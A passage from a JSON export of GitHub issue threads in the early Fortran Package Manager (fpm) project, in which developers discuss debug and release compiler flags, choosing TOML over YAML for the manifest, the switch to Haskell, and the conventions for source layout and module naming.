                    "text": "We will have to iterate on this, I don't know all the details either yet. Here are some guiding principles:\n\nWe should have Debug and Release builds. (I would call it Debug, not Devel.)\nPerhaps also ReleaseCheck (that would enable all optimizations, but keep all runtime checks; it could be named differently, perhaps ReleaseSafe, or something).\n\nThe Debug build should enable all runtime and compile time checks / warnings that a given compiler allows. The Release build should make the fastest build for the given architecture. For ifort I think that's the default (i.e. no options). For gfortran that's -O3 -march=native -ffast-math -funroll-loops (the later gfortran versions also have -Ofast which does a lot of these and a few more --- so we should look into it and probably use it).\nSo as a start, I would start with Debug and Release. Then as we go, we can keep refining it.\nWe can take the initial options for gfortran / Intel from here:\nhttps://www.fortran90.org/src/faq.html#what-compiler-options-should-i-use-for-development\nhttps://www.fortran90.org/src/faq.html#what-compiler-options-should-i-use-for-production-run"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-03-30 19:07:49+00:00",
                    "text": "Those are good suggestions for defaults. But I'm more talking about what we want to allow users to specify.\nShould we only allow users to specify a single set of compiler flags for each of debug and release modes? Or should there be some more granularity available? Different flags for executables vs libraries?\nAlso, when a user specifies compiler flags manually, should they specify the flags directly (i.e. \"-funroll-loops\") or with a more generic option that looks up the specific flag for the given compiler?"
                },
                {
                    "user": "certik",
                    "date": "2020-03-30 21:22:45+00:00",
                    "text": "Ah I see. I would definitely allow to specify any compiler flag to any file and any executable / library. That way it should be possible to build any project out there. It's just that we want to discourage users doing that obviously, but we should allow that.\nRegarding \"generic options\" like \"unroll loops\" for \"-funroll-loops`, I would not do that, because I think it will be very hard to find such options for every compiler. Initially the only generic options that I would allow are Debug / Release / ReleaseSafe. Later on, we can perhaps add more, if users request them.\nSo for example, the user can select Debug mode that would be applied to every file, except those that the user specifically sets manually."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-03-30 21:49:28+00:00",
                    "text": "Ok, that's definitely going to have to take some thinking about how to design on both the fpm.toml side, and the actual build process side."
                },
                {
                    "user": "certik",
                    "date": "2020-03-30 21:54:46+00:00",
                    "text": "We should not over design this. Right now we are just writing a prototype, to help us figure out the requirements, because what you are asking for are the requirements which we do not know yet, until we gain more experience using fpm with actual Fortran codebases."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-03-31 13:52:31+00:00",
                    "text": "You're right. I'm just going to leave out the options to specify compiler flags for now. Until we have time to design it properly."
                },
                {
                    "user": "ivan-pi",
                    "date": "2020-11-23 01:13:31+00:00",
                    "text": "What I personally understand as a debug build is enabling (some of) the following options:\n\nGenerate debugging information (should be used with a lower optimization level)\n\ngfortran -g (use with -O0 or -Og)\nifort (Linux, macOS): -g[n], -debug\nifort (Windows) /Zi, /Z7\nNAG -g\n\n\nEnable backtrace of runtime errors\n\ngfortran  -fbacktrace\nifort -traceback\nNAG -gline\n\n\nRun-time checks\n\ngfortran -fcheck=[all,array-temps,bits,bounds,do,mem,pointer,recursion]\nifort -check=[arg_temp_created,assume,bounds,contiguous,format,output_conversion,pointers,shape,stack,udio_iostat,uninit,all]\nNAG -C, -C=[alias,all,array,bits,calls,dangling,do,intovf,none,present,pointer,recursion,undefined]\n\n\n\nAdditionally, we could set flags related to handling floating-point exceptions as provided here (Intel) and here (gfortran)."
                }
            ]
        },
        {
            "number": 49,
            "user": "everythingfunctional",
            "date": "2020-03-28 18:35:57+00:00",
            "title": "TOML to Settings Architecture",
            "text": "I'm creating this as mostly a reference for how I think we should proceed with having sane defaults to allow minimal fpm.toml files. Right now I'm just reading the toml contents directly into the data structure for the settings for building the project. What I think will make more sense is to have two different data structures. One for reading the settings from the fpm.toml file, and a slightly different one for the settings for the project passed to the rest of the process. This will allow a step for interrogating the file system for some of the defaults based on the presence/absence of information in the fpm.toml file.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-30 03:23:55+00:00",
                    "text": "Closing this since it's been implemented this way."
                }
            ]
        },
        {
            "number": 48,
            "user": "everythingfunctional",
            "date": "2020-03-28 18:30:02+00:00",
            "title": "Simplify example project",
            "text": "This simplifies the example project and sets things up to begin building according to the settings read from fpm.toml",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-03-30 21:10:03+00:00",
                    "text": "Thanks!"
                }
            ]
        },
        {
            "number": 47,
            "user": "everythingfunctional",
            "date": "2020-03-24 21:12:17+00:00",
            "title": "Read fpm toml",
            "text": "Start reading the settings for a package from fpm.toml",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-03-24 21:37:14+00:00",
                    "text": "I've got it reading the first setting from an fpm.toml file. Take a look and let me know what you guys think."
                },
                {
                    "user": "certik",
                    "date": "2020-03-24 22:17:35+00:00",
                    "text": "I think this looks good.\nThis implements explicit layout, which we should support also. Based on our past discussion, by default we would encourage users to use the implicit layout, so they just need to put a file in the bin directory, and fpm will automatically build the binary out of it, just like Cargo."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-03-25 13:36:18+00:00",
                    "text": "I think this looks good.\nThis implements explicit layout, which we should support also. Based on our past discussion, by default we would encourage users to use the implicit layout, so they just need to put a file in the bin directory, and fpm will automatically build the binary out of it, just like Cargo.\n\nImplicit layout will be a bit trickier to implement I think. The default would be only one executable, with main having the default expected name (probably main.f90).\nAll doable. I think we should start with explicit, make sure that works, then come up with lots of example projects, leaving various things out to allow for defaults."
                },
                {
                    "user": "certik",
                    "date": "2020-03-25 16:14:15+00:00",
                    "text": "Here is our last iteration that we did at the Committee meeting in Vegas:\n#39 (comment)\nAnd to have more executables in the app directory, you just add more subdirectories just like Cargo does it I think."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-03-25 16:39:30+00:00",
                    "text": "I think the purpose of going for an implicit, minimal, sane default is that it can be implemented most quickly. You can then assess what's most needed to generalize next. I prefer this approach to development and we use it at Cloudrun.\nOtherwise, we have to make a lot of assumptions on what are all the options and edge cases that will be desired, and we'd spend a lot of time doing that."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-03-25 23:03:06+00:00",
                    "text": "With the toml parser I'm using, it's actually easiest to define the data structure that holds all the necessary settings, and require they be present in the toml file. Then we can figure out how to make that setting optional (have a default). Yes we should start with the simplest possible project and the simplest settings, but it actually is easier to make them required first."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-03-25 23:05:47+00:00",
                    "text": "I'm going to merge this in and then take a stab at simplifying the example project and it's toml file to the bare minimum."
                }
            ]
        },
        {
            "number": 46,
            "user": "everythingfunctional",
            "date": "2020-03-13 02:25:57+00:00",
            "title": "Create first draft of an example fpm.yaml file",
            "text": "This is a first shot at what an fpm.yaml file might look like.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-03-13 03:38:04+00:00",
                    "text": "Thanks for trying to figure out what to put in.\nMy view is to do exactly what Rust / Cargo does. In Cargo, you can set many of these options, but by default, you do not, and you follow the layout. And you then tell cargo to build in Release or Debug modes, and Cargo chooses the default options.\nIn our case, I was thinking of following exactly the same approach. That is, fpm will support all Fortran compilers. Which means, the compiler specific options should not be set in fpm.toml, because those would be specific to a compiler, so would not work with another compiler.\nSo I would suggest to simplify your example as follows:\nname:                package-name\nversion:             0.1.0\nlicense:             BSD3\nauthor:              \"Author name here\"\nmaintainer:          \"example@example.com\"\ncopyright:           \"2020 Author name here\"\n\ndependencies: \n- stdlib\n\ntests-dependencies:\n    - vegetables 1.0  # I think in Cargo this means >= 1.0 and < 2.0\nFinally, I would follow Cargo's naming conventions.\nI am going to post a TOML example."
                },
                {
                    "user": "certik",
                    "date": "2020-03-13 03:44:41+00:00",
                    "text": "Here is the TOML equivalent:\n[package]\nname = \"package-name\"\nversion = \"0.1.0\"\nlicense = \"BSD3\"\nauthors = [\"Author name here <example@example.com>\"]\nedition = \"2018\"\n\n[dependencies]\nstdlib = \"0.2.3\"\n\n[dev-dependencies]\nvegetables = \"1.0\""
                },
                {
                    "user": "certik",
                    "date": "2020-03-13 04:00:30+00:00",
                    "text": "For comparison, a literal translation of the YAML to TOML is:\nname = \"package-name\"\nversion = \"0.1.0\"\nlicense = \"BSD3\"\nauthor = \"Author name here\"\nmaintainer = \"example@example.com\"\ncopyright = \"2020 Author name here\"\ndependencies = [\"../std-lib.tar.gz\"]\ncompiler = \"gfortran\"\ndevel-options = [\"-g\", \"-Wall\", \"-Wextra\", \"-Werror\", \"-pedantic\"]\nrelease-options = [\"-O3\"]\n\n[library]\nsource-dirs = \"src\"\n\n[executables.executable-name]\nmain = \"Main.f90\"\nsource-dirs = \"app\"\nlinker-options = [\"-O3\"]\ndependencies = [\"iso_varying_string\"]\n\n[tests.test-name]\nmain = \"Spec.f90\"\nsource-dirs = \"test\"\nlinker-options = [\"-Og\"]\ndependencies = [\"vegetables >= 1.0 && < 2.0\"]\n(But as I said, I think we should simplify some of the sections and follow Rust's naming scheme.)"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-11 17:59:46+00:00",
                    "text": "Closing, since we're going with toml"
                }
            ]
        },
        {
            "number": 45,
            "user": "everythingfunctional",
            "date": "2020-03-12 03:08:54+00:00",
            "title": "Package File Spec",
            "text": "We need a specification, or at least a start of one, for what should go into the package file and how it should be organized.\nI'd suggest we start by answering the question \"What does fpm need to know about a package in order to be able to build it?\" in as much detail as possible and then trying to organize it logically.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-30 03:24:59+00:00",
                    "text": "I think we've settled this now?"
                },
                {
                    "user": "certik",
                    "date": "2020-04-30 05:25:42+00:00",
                    "text": "Yes.\n\u2026\nOn Wed, Apr 29, 2020, at 9:25 PM, Brad Richardson wrote:\n\n\n I think we've settled this now?\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#45 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWBSCLSYDG6OBIOZH73RPDVRPANCNFSM4LGDENXA>."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-30 14:06:16+00:00",
                    "text": "Ok, closing."
                }
            ]
        },
        {
            "number": 44,
            "user": "everythingfunctional",
            "date": "2020-03-12 03:05:20+00:00",
            "title": "toml or yaml or something else",
            "text": "Are we sold on using toml as the file format for a package manifest/configuration file?\nI see that Rust uses toml, but many other package mangers use others. Haskell's Stack uses yaml, and I think I've seen others use that. I think I've also seen json, and maybe even xml.\nA new project Cargo.toml looks like:\n[package]\nname = \"rusttest\"\nversion = \"0.1.0\"\nauthors = [\"Brad Richardson <brichardson@structint.com>\"]\nedition = \"2018\"\n\n# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html\n\n[dependencies]\n\nand a new project package.yaml (for Haskell) looks like:\nname:                haskelltest\nversion:             0.1.0.0\ngithub:              \"githubuser/haskelltest\"\nlicense:             BSD3\nauthor:              \"Author name here\"\nmaintainer:          \"example@example.com\"\ncopyright:           \"2020 Author name here\"\n\nextra-source-files:\n- README.md\n- ChangeLog.md\n\n# Metadata used when publishing your package\n# synopsis:            Short description of your package\n# category:            Web\n\n# To avoid duplicated efforts in documentation and dealing with the\n# complications of embedding Haddock markup inside cabal files, it is\n# common to point users to the README.md file.\ndescription:         Please see the README on GitHub at <https://github.com/githubuser/haskelltest#readme>\n\ndependencies:\n- base >= 4.7 && < 5\n\nlibrary:\n  source-dirs: src\n\nexecutables:\n  haskelltest-exe:\n    main:                Main.hs\n    source-dirs:         app\n    ghc-options:\n    - -threaded\n    - -rtsopts\n    - -with-rtsopts=-N\n    dependencies:\n    - haskelltest\n\ntests:\n  haskelltest-test:\n    main:                Spec.hs\n    source-dirs:         test\n    ghc-options:\n    - -threaded\n    - -rtsopts\n    - -with-rtsopts=-N\n    dependencies:\n    - haskelltest\n\nI'm not strongly opposed to toml, but it's the one I'm least familiar with. My gut tells me we should go with yaml. I would not suggest json or xml though, too much syntax/line noise.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-03-13 00:35:16+00:00",
                    "text": "Both toml and yaml look good and have sufficient capability. Yaml is personally slightly prettier to me.\nWhich has a more mature parser in Haskell? Let's go with that one.\nI recommend against json for configuration files (even though I use it a lot) because it doesn't allow comments. This would make it harder to work with them in development and testing when you want to quickly try out different values. It's also a bit more noisy (verbose) than either toml or yaml.\nxml burns my eyes."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-03-13 01:44:44+00:00",
                    "text": "There are parsers for both that seem pretty mature. I just think yaml is more naturally represented as a simple/common data structure, so it is easier to work with once it's parsed.\n@certik , do you have a vote?"
                },
                {
                    "user": "certik",
                    "date": "2020-03-13 01:50:06+00:00",
                    "text": "I vote for toml, I think it's more readable, that's what Rust and Python uses and I would follow exactly the Rust model for everything unless we have a good reason not to. Fortran is close to Python and Rust in most respects than to Haskell.\n\u2026\nOn Thu, Mar 12, 2020, at 7:44 PM, Brad Richardson wrote:\n\n\n There are parsers for both that seem pretty mature. I just think yaml\n is more naturally represented as a simple/common data structure, so it\n is easier to work with once it's parsed.\n\n @certik <https://github.com/certik> , do you have a vote?\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#44 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWCKGWTCASXNGTPTJATRHGFZRANCNFSM4LGDB7AA>."
                },
                {
                    "user": "certik",
                    "date": "2020-03-13 02:03:10+00:00",
                    "text": "Here are good pros and cons:\n\nhttps://www.reddit.com/r/rust/comments/7izxrg/toml_or_yaml_for_config/\n\nOne big downside of yaml is that it is very complicated. TOML is very simple for flat configuration files, and Cargo shows that flat is enough. And we should strive for flat.\n\nI agree that we should not use JSON or XML.\n\u2026\nOn Thu, Mar 12, 2020, at 7:49 PM, Ond\u0159ej \u010cert\u00edk wrote:\n I vote for toml, I think it's more readable, that's what Rust and\n Python uses and I would follow exactly the Rust model for everything\n unless we have a good reason not to. Fortran is close to Python and\n Rust in most respects than to Haskell.\n\n On Thu, Mar 12, 2020, at 7:44 PM, Brad Richardson wrote:\n >\n >\n > There are parsers for both that seem pretty mature. I just think yaml\n > is more naturally represented as a simple/common data structure, so it\n > is easier to work with once it's parsed.\n >\n > @certik <https://github.com/certik> , do you have a vote?\n >\n > \u2014\n > You are receiving this because you were mentioned.\n > Reply to this email directly, view it on GitHub\n > <#44 (comment)>,\n > or unsubscribe\n > <https://github.com/notifications/unsubscribe-auth/AAAFAWCKGWTCASXNGTPTJATRHGFZRANCNFSM4LGDB7AA>.\n >"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-03-13 03:10:43+00:00",
                    "text": "@certik , that sounds reasonable. I put together an example of what an fpm.yaml file would look like (#46). Could you try converting that to toml so we can see what that would look like?"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-03-13 04:08:58+00:00",
                    "text": "I am now in favor of toml as well. I like the idea of following the Rust packaging model."
                },
                {
                    "user": "certik",
                    "date": "2020-03-23 16:29:17+00:00",
                    "text": "@everythingfunctional see my comments at #46: #46 (comment) how it would look like in YAML and TOML. Let me know your thoughts."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-03-23 16:56:09+00:00",
                    "text": "I think the TOML looks fine. I'll start trying to put together the logic to pull in the dependencies, and compile them in the right order based on the fpm.toml file."
                },
                {
                    "user": "certik",
                    "date": "2020-03-23 18:49:37+00:00",
                    "text": "@everythingfunctional perfect. Let me know once you have something, and I'll test it."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-03-28 18:31:28+00:00",
                    "text": "I'm going to go ahead and close this issue, since I think we've decided to stick with toml. Plus we're now moving forward in that direction."
                }
            ]
        },
        {
            "number": 43,
            "user": "everythingfunctional",
            "date": "2020-03-07 03:48:33+00:00",
            "title": "Add place to specify other libraries when building library",
            "text": "This completes all the necessary capabilities of the build system.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-03-09 03:32:59+00:00",
                    "text": "Next step is to start putting together fpm.toml files and code to read them."
                }
            ]
        },
        {
            "number": 42,
            "user": "everythingfunctional",
            "date": "2020-02-28 15:52:57+00:00",
            "title": "Bpr add build system",
            "text": "Can now build a single project. Assumes all files in the app directory are programs.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-02-28 16:15:59+00:00",
                    "text": "I tested it locally and it seems to work. Thanks!"
                }
            ]
        },
        {
            "number": 41,
            "user": "certik",
            "date": "2020-02-25 22:45:09+00:00",
            "title": "Test calling GFortran from Haskell",
            "text": "Tests the new builder on the example.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-02-28 17:27:18+00:00",
                    "text": "@everythingfunctional I think the build code in master failed on Windows: https://github.com/fortran-lang/fpm/pull/41/checks?check_run_id=475345857"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-03-04 04:16:07+00:00",
                    "text": "Got it to work on Windows. Problem was inconsistencies with file paths. At various places, Shake normalizes them to Linux form, but other things are still in Windows form."
                },
                {
                    "user": "certik",
                    "date": "2020-03-04 04:41:30+00:00",
                    "text": "@everythingfunctional thanks a lot for fixing it! I am really happy it works on Windows also."
                }
            ]
        },
        {
            "number": 40,
            "user": "everythingfunctional",
            "date": "2020-02-25 18:34:35+00:00",
            "title": "Switch to using Haskell",
            "text": "",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-02-25 18:43:48+00:00",
                    "text": "The Linux and Mac works, the Windows fails due to mstksg/setup-stack#5. I am figuring a workaround."
                },
                {
                    "user": "certik",
                    "date": "2020-02-25 18:48:36+00:00",
                    "text": "@milancurcic: To describe our plan here: @everythingfunctional and I decided to join forces on FPM. Brad has already an implementation in Haskell of a subset of what we want FPM to do, and we decided to use his code to get the minimal viable version of FPM. So we'll do it in Haskell. It turns out Haskell's Stack is like Rust's Cargo, and both do what we want to achieve with FPM.\nOnce we have the minimal viable version working, we, as a community, will have to choose a language to implement this in for the long run (I still think Rust is not a bad option). But for now our goal is to get a minimal version out there, and the best is to join forces as much as we can."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-02-25 18:54:02+00:00",
                    "text": "Sounds good. I like Haskell as well. I was more interested in learning Rust though. However this is a practical decision and getting to MVP sooner is what matters.\nI only wish this was discussed in the open rather than decided under the table. Not so much about who makes the decision, but more about how and why are decisions made."
                },
                {
                    "user": "certik",
                    "date": "2020-02-25 19:04:34+00:00",
                    "text": "@milancurcic thanks for the comment. (Yes, I am personally more interested in learning Rust also.)\nI should have phrased it differently. We are working on the PR and once we are done with the PR, we would like to get a community agreement that this would be an ok path to get to the MVP. We have not made the decision under the table. Only if the community agrees, then we will merge the PR.\nThe downside is that Haskell is not as well known language. The huge upside is that now we have 2 developers (@everythingfunctional and myself) as opposed to just one developer (myself). And that, in my eyes, outweighs the slight negative of using a different language for the MVP.\nOnce MVP is out, we would need to decide what language to use for the long run. (I think I would prefer either C++ or Rust for that.)"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-02-25 19:16:03+00:00",
                    "text": "Thanks for clarifying that, sounds like a good plan."
                },
                {
                    "user": "certik",
                    "date": "2020-02-25 19:49:57+00:00",
                    "text": "Tests pass. This is currently just a bare bones Haskell project, but it runs on Linux, macOS and Windows.\n@milancurcic would you be ok with merging this PR now? It would help us to develop faster --- have a master that passes tests everywhere and we can quickly send PRs to get the features implemented. The Rust version is still there in the archive directory if we every wanted to come back to it."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-02-25 19:51:27+00:00",
                    "text": "I think we can have some MVP within the week. If things go wrong or the community would rather switch back to using Rust or something else, we can always switch back to that."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-02-25 19:58:00+00:00",
                    "text": "This is fine with me. As I'm not actively engaged yet, I don't have much say. But I also don't foresee issues when I do start contributing. So please go ahead with whatever you find is the best way forward and keep discussing."
                },
                {
                    "user": "certik",
                    "date": "2020-02-25 22:08:44+00:00",
                    "text": "Thanks @milancurcic! We'll keep you updated."
                }
            ]
        },
        {
            "number": 39,
            "user": "certik",
            "date": "2020-02-24 21:56:43+00:00",
            "title": "Package layout",
            "text": "We've been working with @everythingfunctional on the standardization of the layout. First iteration:\n$ tree .\n.\n\u251c\u2500\u2500 fpm.toml\n\u2514\u2500\u2500 src\n    \u251c\u2500\u2500 a.f90\n    \u251c\u2500\u2500 b\n    \u2502\u00a0\u00a0 \u2514\u2500\u2500 utils.f90\n    \u2514\u2500\u2500 utils.f90\n\n2 directories, 4 files\n$ cat fpm.toml \nName \"a\"\n$ cat src/a.f90 \nmodule a\nuse a_utils, only: util1\nuse a_b_utils, only: util2\n\nimplicit none\nprivate\npublic util1, util2\nend module\n$ cat src/utils.f90 \nmodule a_utils\nimplicit none\nprivate\npublic util1\n\ninteger :: util1\n\nend module\n$ cat src/b/utils.f90 \nmodule a_b_utils\nimplicit none\nprivate\npublic util2\n\ninteger :: util2\n\nend module",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-02-24 23:17:07+00:00",
                    "text": "Here is a second iteration of the above layout:\n$ tree .\n.\n\u251c\u2500\u2500 app\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 main.f90\n\u251c\u2500\u2500 fpm.toml\n\u2514\u2500\u2500 src\n    \u251c\u2500\u2500 a\n    \u2502\u00a0\u00a0 \u251c\u2500\u2500 b\n    \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 utils.f90\n    \u2502\u00a0\u00a0 \u2514\u2500\u2500 utils.f90\n    \u251c\u2500\u2500 a.f90\n    \u251c\u2500\u2500 x\n    \u2514\u2500\u2500 x.f90\n\n5 directories, 6 files"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-04-27 17:22:34+00:00",
                    "text": "I'm really confused now.\n\nThis thread doesn't say that the source file should have the same name as the module;\nIt actually implies that it can be different, e.g. utils.f90 defines module a_utils.\nfpm can't build this example because of #57.\n\nSo based on feedback so far, I assume that source file should be named the same as the module, and perhaps the spec in this thread is out of date. Then you have (ignoring app and x.f90 for simplicity):\n$ tree .\n.\n\u251c\u2500\u2500 fpm.toml\n\u2514\u2500\u2500 src\n    \u251c\u2500\u2500 a.f90\n    \u251c\u2500\u2500 a_utils.f90\n    \u2514\u2500\u2500 b\n        \u2514\u2500\u2500 a_b_utils.f90\n\n2 directories, 4 files\n\nNow the source files have the same name as the modules they define. This doesn't work either because fpm builds b_a_b_utils.o out of src/b/a_b_utils.f90:\n# gfortran (for build/debug/library/a_utils.o build/debug/library/a_utils.mod)\n# gfortran (for build/debug/library/b_a_b_utils.o build/debug/library/b_a_b_utils.mod)\nfpm-exe: Error when running Shake build system:\n  at want, called at src/Build.hs:188:11 in fpm-0.1.0.0-9zFE4ut013U9YSOSmXT3I3:Build\n* Depends on: build/debug/library/package-name.a\n  at need, called at src/Build.hs:186:13 in fpm-0.1.0.0-9zFE4ut013U9YSOSmXT3I3:Build\n* Depends on: build/debug/library/b_a_b_utils.o\n  at &%>, called at src/Build.hs:166:11 in fpm-0.1.0.0-9zFE4ut013U9YSOSmXT3I3:Build\n* Depends on: build/debug/library/b_a_b_utils.o build/debug/library/b_a_b_utils.mod\n  at error, called at src/Development/Shake/Internal/Rules/Files.hs:245:13 in shake-0.18.5-44KSA7uQF2VObxzEvLYZx:Development.Shake.Internal.Rules.Files\n* Raised the exception:\nError, &%> rule failed to produce 1 file (out of 2)\n  build/debug/library/b_a_b_utils.o\n  build/debug/library/b_a_b_utils.mod - MISSING\n\nOkay, so fpm does some renaming of files under the hood--b/a_b_utils.f90 compiles to b_a_b_utils.f90. But the compiler emits a_b_utils.mod and fpm expects b_a_b_utils.mod.\nA-ha! Maybe I need to call my module b_a_b_utils:\n$ head -1 src/b/a_b_utils.f90 \nmodule b_a_b_utils\n\nGreat, fpm now builds correctly.\nPerhaps this is what Brad meant in #57 when he said\n\nwe want the file name to match the module name, and the module name to include the path components of the file name.\n\nI didn't understand this because the 1st half of the sentence conflicts the 2nd half of the sentence.\nBut I think the 2nd half is key: If you have src/a/b/c/utils.f90, then the module should be called a_b_c_utils.\nGiven this, perhaps I can reverse engineer the correct spec. Let's try a third iteration:\n$ tree .\n.\n\u251c\u2500\u2500 fpm.toml\n\u2514\u2500\u2500 src\n    \u251c\u2500\u2500 a.f90\n    \u251c\u2500\u2500 b\n    \u2502   \u2514\u2500\u2500 b_utils.f90\n    \u2514\u2500\u2500 utils.f90\n\nThen, the contents are:\n$ cat src/a.f90 \nmodule a\nuse utils, only: util1\nuse b_b_utils, only: util2\n\nimplicit none\nprivate\npublic util1, util2\nend module\n$ cat src/utils.f90 \nmodule utils\nimplicit none\nprivate\npublic util1\n\ninteger :: util1\n\nend module\n$ cat src/b/b_utils.f90 \nmodule b_b_utils\nimplicit none\nprivate\npublic util2\n\ninteger :: util2\n\nend module\n\nfpm builds this correctly.\nNow, if I went through this much trouble to figure this out with help from fpm developers, imagine other people trying to build their thing with fpm. :)\nWe need a clear, clean, explicit spec."
                },
                {
                    "user": "certik",
                    "date": "2020-04-27 17:34:12+00:00",
                    "text": "@everythingfunctional and I discussed this, and the solution that we both liked in the end is precisely as I posted above (which is different to your comment), I just didn't have time to write it more explicitly. @milancurcic, please help us, we are doing what we can in our little time. If you have time, please help us write the spec.\nThe most natural way seems to have a file src/a/b/utils.f90, which means a package \"a.b\", and module \"a.b.utils\" (using Python syntax). However, in Fortran we do not have nested packages, until j3-fortran/fortran_proposals#86 is implemented. But what we can do now is to put the package name in the name of the module, so the file src/a/b/utils.f90 would start with module a_b_utils and fpm would check / enforce it. To move files around, you can simply move them, and fpm will have a mode to rename the first module line correctly.\nWhat you are proposing is to name the file as src/a/b/a_b_utils.f90 which is redundant and we feel it would be quite a pain to keep correctly named. It's much easier to simply call it src/a/b/utils.f90. However, the first module line must have the full name, to disambiguate src/a/utils.f90 from src/a/b/utils.f90.\nNow we are just working on fpm to work like this. If there are some bugs, then we need to fix them.\nIn particular, we need to write more tests, which would clarify what is meant to work."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-27 17:38:11+00:00",
                    "text": "Ok, yeah. Here's what I think the specification about that would be.\nfpm replaces the path separators with underscores when determining the name of the .o file to be created when compiling a given source file. For modules, it also expects compiling that source file to create a .mod file with the same name as the .o file. This means that a source file a/b/utils.f90 should contain a module named a_b_utils.\nI'm sure this could use a bit more wordsmithing or clarification. It also needs to be fit into a larger specification about the expected (default) organization of an fpm compatible project, with instructions about how to override the defaults."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-04-27 17:57:01+00:00",
                    "text": "@milancurcic, please help us, we are doing what we can in our little time. If you have time, please help us write the spec.\n\nWhat do you think I'm doing? :)\n\nWhat you are proposing is to name the file as src/a/b/a_b_utils.f90 which is redundant and we feel it would be quite a pain to keep correctly named. It's much easier to simply call it src/a/b/utils.f90. However, the first module line must have the full name, to disambiguate src/a/utils.f90 from src/a/b/utils.f90.\n\nI don't propose that, it's how I originally understood Brad, but that's not what he meant and I understood it later. What led me astray is that the 2nd iteration of your tree wasn't consistent with the module names in the original post.\nBased on the feedback, here's the package structure (same as Ondrej's 2nd iteration):\n$ tree .\n.\n\u251c\u2500\u2500 fpm.toml\n\u2514\u2500\u2500 src\n    \u251c\u2500\u2500 a.f90\n    \u251c\u2500\u2500 a_utils.f90\n    \u2514\u2500\u2500 b\n        \u2514\u2500\u2500 utils.f90\n\n2 directories, 4 files\n\nAnd here are the contents:\n$ cat src/a.f90 \nmodule a\nuse a_utils, only: util1\nuse a_b_utils, only: util2\n\nimplicit none\nprivate\npublic util1, util2\nend module\n$ cat src/a_utils.f90 \nmodule a_utils\nimplicit none\nprivate\npublic util1\n\ninteger :: util1\n\nend module\n$ cat src/b/utils.f90 \nmodule a_b_utils\nimplicit none\nprivate\npublic util2\n\ninteger :: util2\n\nend module\n\nDoes this look correct?"
                },
                {
                    "user": "certik",
                    "date": "2020-04-27 18:17:27+00:00",
                    "text": "Almost. You are still putting the prefix into the filename in a_utils.f90. It should look like in #39 (comment). So put a_utils.f90 into a/utils.f90.\nI also had the b module nested under a, but that just depends what you are trying to show. Both can be done."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-04-27 18:27:00+00:00",
                    "text": "Oops, you're right, I did that. If we ignore src/x* and app, we get:\n$ tree .\n.\n\u251c\u2500\u2500 fpm.toml\n\u2514\u2500\u2500 src\n    \u251c\u2500\u2500 a\n    \u2502\u00a0\u00a0 \u251c\u2500\u2500 b\n    \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 utils.f90 # module a_b_utils\n    \u2502\u00a0\u00a0 \u2514\u2500\u2500 utils.f90 # module a_utils\n    \u2514\u2500\u2500 a.f90 # module a\n\n3 directories, 4 files\n\nI put module names as # comments next to each file. I think this is correct now and I agree with it.\nIf you agree, I'll submit a PR to document this."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-04-27 18:32:28+00:00",
                    "text": "Btw, current master of fpm builds this correctly."
                },
                {
                    "user": "certik",
                    "date": "2020-04-27 19:04:45+00:00",
                    "text": "@milancurcic yes, if you could please document this and the reasoning behind this decision, that would be awesome. I am really happy you agree with this also. It's different to what I've been used to doing, but only in the fact that each module has the full name in the module line (and when you think about it, it makes sense to do it that way until j3-fortran/fortran_proposals#86 is implemented). Otherwise I've seen lots of projects structured in directories like this."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-27 20:38:49+00:00",
                    "text": "It looks like we're on the same page now. Thanks for struggling through this @milancurcic . I know we didn't do a very good job documenting it, so your efforts are hugely appreciated."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-30 03:30:00+00:00",
                    "text": "I think this is pretty well settled now. Should we close this?"
                },
                {
                    "user": "certik",
                    "date": "2020-04-30 05:25:10+00:00",
